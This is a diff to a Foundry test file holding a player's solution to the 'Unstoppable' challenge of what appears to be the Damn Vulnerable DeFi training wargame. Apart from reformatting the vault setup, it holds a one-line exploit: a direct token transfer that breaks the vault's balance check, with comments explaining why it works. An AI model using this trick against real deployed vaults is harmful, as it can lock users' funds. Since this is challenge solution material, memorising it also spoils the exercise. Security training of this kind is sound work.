@@ -32,7 +32,11 @@ contract UnstoppableChallenge is Test {
         startHoax(deployer);
         // Deploy token and vault
         token = new DamnValuableToken();
-        vault = new UnstoppableVault({_token: token, _owner: deployer, _feeRecipient: deployer});
+        vault = new UnstoppableVault({
+            _token: token,
+            _owner: deployer,
+            _feeRecipient: deployer
+        });
 
         // Deposit tokens to vault
         token.approve(address(vault), TOKENS_IN_VAULT);
@@ -91,9 +95,9 @@ contract UnstoppableChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_unstoppable() public checkSolvedByPlayer {
-        //NOTE (tina): transfer a token to the vault to increase 'balanceBefore'
+        //NOTE (tina): transfer a token to the vault without using 'deposit' function to increase 'balanceBefore'
         token.transfer(address(vault), 1);
-        
+
         //this is why the exploit works: 'totalSupply' only increase when someone send token via 'deposit' function
     }
 
